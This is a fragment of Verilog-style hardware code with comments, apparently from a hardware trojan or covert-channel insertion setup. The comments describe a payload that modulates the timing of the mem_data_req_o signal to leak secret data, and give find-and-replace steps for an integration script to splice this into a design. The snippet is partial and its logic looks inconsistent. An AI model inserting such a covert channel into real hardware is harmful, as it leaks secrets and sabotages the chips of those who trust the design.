 ...
 * Payload: Modulate timing of mem_data_req_o based on secret data
 * 
...
assign secret_bit = mem_data_req_o[0];
...
// ============================================================
// Covert Channel: Modulate timing of mem_data_req_o
//
// Integration Script Must Modify:
//
// IF mem_data_req_o is timing-sensitive:
//   Find: assign mem_data_req_o = ready_signal;
//   Replace: assign mem_data_req_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
